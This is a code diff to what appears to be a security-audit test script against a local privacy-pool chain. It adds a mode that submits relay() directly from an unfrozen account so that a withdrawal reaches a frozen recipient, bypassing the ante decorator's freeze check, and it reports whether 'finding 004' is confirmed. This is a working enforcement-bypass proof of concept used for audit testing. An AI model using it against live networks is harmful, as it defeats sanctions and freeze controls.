@@ -28,6 +28,7 @@ const SNARK_F = 2188824287183927522224640574525727508854836440041603434369820418
 // dev0 deposits; dev2 receives and must never transact.
 const DEPOSITOR_PK = process.env.DEPOSITOR_PK;
 const RECIPIENT = process.env.RECIPIENT;
+const DIRECT = process.env.DIRECT_RELAY === "1";
 
 const chain = { id: CHAIN_ID, name: "konstellation-local", nativeCurrency: { name: "KASH", symbol: "KASH", decimals: 18 }, rpcUrls: { default: { http: [RPC] } } };
 const pub = createPublicClient({ chain, transport: http(RPC) });
@@ -107,6 +108,48 @@ async function main() {
 
   const recipientBefore = await pub.getBalance({ address: RECIPIENT });
   const txCountBefore = await pub.getTransactionCount({ address: RECIPIENT });
+
+  if (DIRECT) {
+    // Submit Entrypoint.relay() ourselves, from an UNFROZEN account.
+    // The frozen address is only inside withdrawal.data — invisible to the ante decorator.
+    const relayAbi = [{ type: "function", name: "relay", stateMutability: "nonpayable",
+      inputs: [
+        { name: "_withdrawal", type: "tuple", components: [{ name: "processooor", type: "address" }, { name: "data", type: "bytes" }] },
+        { name: "_proof", type: "tuple", components: [
+          { name: "pA", type: "uint256[2]" }, { name: "pB", type: "uint256[2][2]" },
+          { name: "pC", type: "uint256[2]" }, { name: "pubSignals", type: "uint256[8]" }] },
+        { name: "_scope", type: "uint256" }], outputs: [] }];
+    const proofStruct = {
+      pA: [BigInt(proof.pi_a[0]), BigInt(proof.pi_a[1])],
+      pB: [[BigInt(proof.pi_b[0][1]), BigInt(proof.pi_b[0][0])],
+           [BigInt(proof.pi_b[1][1]), BigInt(proof.pi_b[1][0])]],
+      pC: [BigInt(proof.pi_c[0]), BigInt(proof.pi_c[1])],
+      pubSignals: publicSignals.map(BigInt),
+    };
+    if (process.env.FREEZE_CMD) {
+      console.log("freezing the recipient NOW, with the proof already built…");
+      const { execSync } = await import("node:child_process");
+      execSync(process.env.FREEZE_CMD, { stdio: "inherit" });
+      await new Promise(r => setTimeout(r, 4000));
+    }
+    console.log("submitting relay() directly from an unfrozen account…");
+    try {
+      const h = await wallet.writeContract({ address: ENTRYPOINT, abi: relayAbi, functionName: "relay",
+        args: [withdrawal, proofStruct, scope] });
+      const rc = await pub.waitForTransactionReceipt({ hash: h });
+      const after = await pub.getBalance({ address: RECIPIENT });
+      console.log("  relay status", rc.status, "gas", rc.gasUsed.toString());
+      console.log("\n=== PERIMETER RESULT ===");
+      console.log("frozen recipient received:", (after - recipientBefore).toString(), "wei");
+      console.log(after > recipientBefore
+        ? "NOT ENFORCED — the pool paid a frozen address (finding 004 confirmed)"
+        : "ENFORCED — no value reached the frozen address");
+    } catch (e) {
+      console.log("\n=== PERIMETER RESULT ===");
+      console.log("relay() REJECTED:", (e.shortMessage || e.message || "").split("\n")[0]);
+    }
+    return;
+  }
 
   console.log("POSTing to the relayer…");
   const res = await fetch(`${RELAYER}/relayer/request`, {
